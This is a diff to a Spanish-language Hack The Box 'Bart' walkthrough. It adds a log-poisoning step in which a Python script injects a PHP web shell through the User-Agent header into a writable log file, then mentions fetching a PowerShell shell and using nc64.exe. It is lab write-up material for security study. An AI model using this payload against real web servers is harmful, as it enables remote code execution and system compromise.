@@ -126,7 +126,7 @@ Pues yo no hubiera podido ver esto solo pero si intentamos registranos de acuerd
 ![image](https://github.com/gecr07/Bart-HTB/assets/63270579/371da5fe-0627-4863-9074-ccb5c9ae1516)
 
 ```
-curl -X POST http://internal-01.bart.htb/simple_chat/login_form.php -d "uname=masa&password=masa1234"
+curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=masa&password=masa1234"
 ```
 
 ![image](https://github.com/gecr07/Bart-HTB/assets/63270579/aa59b77e-66eb-4861-b411-2756aabec176)
@@ -134,10 +134,34 @@ curl -X POST http://internal-01.bart.htb/simple_chat/login_form.php -d "uname=ma
 ![image](https://github.com/gecr07/Bart-HTB/assets/63270579/3ac269b9-79e1-40b5-8f32-24b3c626d805)
 
 
+Si vemos el codigo vemos algo raro
 
+![image](https://github.com/gecr07/Bart-HTB/assets/63270579/218edb21-ee54-4ac2-bdc8-e627b8089bd8)
 
+Nos encontramos que esa pagina esta como capturando el user agent. Y aparte permite que creemoes un arhivo con lo cual se podria
 
+```
+http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
 
+```
+
+### RCE (log poisoning)
+
+Pues se puede hacer de varias maneras pero esta es con python y requests
+
+```
+import requests
+proxies={'http':'http://127.0.0.1:8080'}
+headers={'User-Agent':'MASA: <?php system($_GET['cmd']); ?>'}
+r = requests.get('http://internal-01.bart.htb/log/log.php?filename=log1.php&username=harvey', proxies=proxies, headers=headers)
+
+```
+
+Ya sabes log1.php?cmd=descarga tu shell powershell nigsha...
+
+![image](https://github.com/gecr07/Bart-HTB/assets/63270579/61bd98bd-74ba-4d75-bd86-e6b16b4da29b)
+
+Siempre es importante pasarse a la arquitecura de 64 por lo que la manera mas facil por lo menos que yo he visto es nc64.exe. 
 
 
 
